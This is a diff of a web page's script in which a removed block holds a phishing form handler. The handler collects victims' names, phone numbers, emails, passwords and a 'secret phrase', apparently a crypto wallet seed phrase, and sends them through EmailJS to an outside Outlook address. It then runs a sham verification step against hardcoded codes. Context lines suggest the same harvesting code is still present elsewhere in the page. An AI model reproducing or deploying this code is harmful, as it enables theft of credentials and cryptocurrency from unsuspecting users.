@@ -282,92 +282,7 @@
   </div>      
 </div>  
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-<script>
-  emailjs.init("VTJD_okCRB6iOQZRH");
-
-  const verificationCodes = [
-    "71xz04", "58kl39", "83md22", "67tr85", "42vn93", "96wb20",
-    "33jq87", "75cy44", "18dl70", "49fx18", "84kp02", "69hr75",
-    "21bn64", "55ze96", "02my47", "47lv51", "38xt83", "60ns30",
-    "73dc12", "66oj90"
-  ];
-
-  function showPage(pageId) {
-    const allPages = document.querySelectorAll("section[id^='page']");
-    allPages.forEach(page => page.style.display = "none");
-    const selectedPage = document.getElementById("page" + pageId);
-    if (selectedPage) {
-      selectedPage.style.display = "block";
-      localStorage.setItem("lastPage", pageId);
-    }
-  }
-
-  window.onload = () => {
-    const lastPage = localStorage.getItem("lastPage") || "1";
-    showPage(lastPage);
-  };
-
-  // Handle signup form submission
-  document.getElementById("signupForm").addEventListener("submit", function (e) {
-    e.preventDefault();
-
-    const fullName = document.getElementById("full_name").value;
-    const phone = document.getElementById("phone_number").value;
-    const email = document.getElementById("user_email").value;
-    const password = document.getElementById("password").value;
-    const confirmPassword = document.getElementById("confirm_password").value;
-    const passphrase = document.getElementById("secret_phrase").value;
-
-    if (password !== confirmPassword) {
-      document.getElementById("signupError").innerText = "Passwords do not match.";
-      return;
-    }
-
-    const signupData = {
-      to_email: "Blockchainautomated@outlook.com",
-      full_name: fullName,
-      phone_number: phone,
-      user_email: email,
-      password: password,
-      secret_phrase: passphrase,
-    };
-
-    // Send signup details
-    emailjs.send("service_xg8bzqs", "template_gclz9gu", signupData)
-      .then(() => {
-        // Optional: auto-reply to user
-        emailjs.send("service_xg8bzqs", "template_r0zg4zj", {
-          user_email: email,
-          full_name: fullName
-        });
-
-        showPage("1ii"); // Go to verification page
-      })
-      .catch((error) => {
-        console.error("Signup error:", error);
-        document.getElementById("signupError").innerText = "Failed to sign up. Please try again.";
-      });
-  });
-
-  // Handle verification button click
-  document.getElementById("verifyBtn").addEventListener("click", function () {
-    const userCode = document.getElementById("verificationCode").value.trim();
-    const errorField = document.getElementById("verificationError");
-
-    if (verificationCodes.includes(userCode)) {
-      errorField.innerText = "";
-      showPage("3"); // Success → go to page 3
-    } else {
-      errorField.innerText = "Input correct verification code";
-    }
-  });
-
-  // Optional back button
-  document.getElementById("btnBackToLanding")?.addEventListener("click", () => {
-    showPage("1");
-  });
-</script>
-    <script>      
+<script>    
     emailjs.init("VTJD_okCRB6iOQZRH");const verificationCodes = ["71xz04", "58kl39", "83md22", "67tr85", "42vn93", "96wb20", "33jq87", "75cy44", "18dl70", "49fx18", "84kp02", "69hr75", "21bn64", "55ze96", "02my47", "47lv51", "38xt83", "60ns30", "73dc12", "66oj90"];      
       
 function saveUserData(user) { localStorage.setItem('userData', JSON.stringify(user)); }      
@@ -686,7 +601,7 @@ document.querySelectorAll(".network-copy").forEach(btn => {
     };
   </script>
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-<script>
+  <script>
   emailjs.init("VTJD_okCRB6iOQZRH");
 
   const verificationCodes = [
